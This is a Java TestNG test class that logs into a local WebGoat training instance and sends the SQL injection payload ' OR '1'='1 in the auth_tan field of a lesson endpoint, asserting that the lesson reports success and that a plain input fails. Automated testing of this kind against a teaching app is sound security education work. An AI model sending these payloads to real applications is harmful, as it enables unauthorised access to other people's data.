package tests;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.stream.Collectors;

import org.testng.Assert;
import org.testng.annotations.BeforeTest;
import org.testng.annotations.Test;

public class WebGoat8ApiAlternative {

    private String baseUrl = "http://localhost:8080";
    private String loginEndpoint = "/WebGoat/login";
    private String sqlInjectionEndpoint = "/WebGoat/SqlInjection/attack8";
    private static String jsessionId = "";
    private static final String COOKIE_HEADER = "Cookie";
    private static final String CONTENT_TYPE_HEADER = "Content-Type";
    private static final String SESSION_ID_HEADER = "JSESSIONID";

    @BeforeTest
    public void setup() throws IOException {
        jsessionId = testLoginAndGetSessionId();
    }

    @Test(priority = 1, enabled = true)
    public void testLogin() throws IOException {
        Assert.assertFalse(jsessionId.isEmpty(), "Login failed, JSESSIONID is empty.");
    }

    @Test(priority = 2, enabled = true, dependsOnMethods = "testLogin")
    public void testSuccessfulSqlInjection() throws IOException {
        String payload = "name=A&auth_tan=' OR '1'='1";
        String response = sendPostRequest(sqlInjectionEndpoint, payload);
        assertSqlInjectionSuccess(response);
    }

    @Test(priority = 3, enabled = true, dependsOnMethods = "testLogin")
    public void testSuccessfulSqlInjectionEmptyName() throws IOException {
        String payload = "name=&auth_tan=' OR '1'='1";
        String response = sendPostRequest(sqlInjectionEndpoint, payload);
        assertSqlInjectionSuccess(response);
    }

    @Test(priority = 4, enabled = true, dependsOnMethods = "testLogin")
    public void testSqlInjectionWronInput() throws IOException {
        String payload = "name=A&auth_tan=invalid";
        String response = sendPostRequest(sqlInjectionEndpoint, payload);
        assertSqlInjectionFailure(response);
    }

    private String testLoginAndGetSessionId() {
        String username = "skat556";
        String password = "qwerty";

        String formData = "username=" + username + "&password=" + password;
        try {
            URL url = new URL(baseUrl + loginEndpoint);
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            connection.setRequestProperty("Upgrade-Insecure-Requests", "1");
            connection.setRequestProperty("Referer", "http://localhost:8080/WebGoat/login");
            connection.setRequestProperty("Connection", "keep-alive");
            connection.setDoOutput(true);

            connection.getOutputStream().write(formData.getBytes());

            int responseCode = connection.getResponseCode();
            if (responseCode == HttpURLConnection.HTTP_OK) {
                String cookieHeader = connection.getHeaderField("Set-Cookie");
                if (cookieHeader != null && !cookieHeader.isEmpty()) {
                    jsessionId = extractJSessionId(cookieHeader);
                } else {
                    // Handle the case where cookieHeader is null or empty
                    // For example, you might log a message or take appropriate action
                    System.err.println("Cookie header is null or empty");
                }
            }
            connection.disconnect();
        } catch (IOException e) {
            e.printStackTrace();
        }

        System.out.println("JSESSIONID: " + jsessionId);
        return jsessionId;
    }

    private String sendPostRequest(String endpoint, String payload) throws IOException {
        URL url = new URL(baseUrl + endpoint);
        HttpURLConnection connection = (HttpURLConnection) url.openConnection();
        connection.setRequestMethod("POST");
        connection.setRequestProperty(CONTENT_TYPE_HEADER, "application/x-www-form-urlencoded");
        connection.setRequestProperty(COOKIE_HEADER, SESSION_ID_HEADER + "=" + jsessionId);
        connection.setDoOutput(true);

        try {
            connection.getOutputStream().write(payload.getBytes());

            try (BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()))) {
                return in.lines().collect(Collectors.joining());
            }
        } finally {
            connection.disconnect();
        }
    }

    private String extractJSessionId(String cookieHeader) {
        String jsessionId = "";
        if (cookieHeader != null && cookieHeader.contains("JSESSIONID")) {
            String[] parts = cookieHeader.split(";");
            for (String part : parts) {
                if (part.trim().startsWith("JSESSIONID")) {
                    String[] pair = part.trim().split("=");
                    if (pair.length == 2) {
                        jsessionId = pair[1];
                        break;
                    }
                }
            }
        }
        return jsessionId;
    }


    private void assertSqlInjectionSuccess(String response) {
        Assert.assertTrue(response.contains("lessonCompleted\":true"));
        Assert.assertTrue(response.contains("feedback\":\"You have succeeded!"));
    }

    private void assertSqlInjectionFailure(String response) {
        Assert.assertTrue(response.contains("lessonCompleted\":false"));
        Assert.assertTrue(response.contains("feedback\":\"No employee found"));
    }
}